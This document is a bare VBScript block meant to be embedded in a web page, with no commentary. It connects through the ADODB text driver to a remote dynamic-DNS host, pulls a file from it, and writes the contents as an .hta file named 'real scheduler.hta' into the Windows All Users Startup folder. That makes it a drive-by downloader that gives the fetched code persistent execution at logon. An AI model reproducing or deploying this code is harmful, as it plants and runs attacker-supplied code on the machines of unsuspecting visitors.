<script language="vbs">
Dim Conn, rs
Set Conn = CreateObject("ADODB.Connection")
Conn.Open "Driver={Microsoft Text Driver (*.txt; *.csv)};" & _
"Dbq=http://arite.zapto.org;" & _
"Extensions=asc,csv,tab,txt;" & _
"Persist Security Info=False"
Dim sql
sql = "SELECT * from foobar.txt"
set rs = conn.execute(sql)
set rs =CreateObject("ADODB.recordset")
rs.Open "SELECT * from foobar.txt", conn
rs.Save "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\real scheduler.hta", adPersistXML
rs.close
conn.close
</script>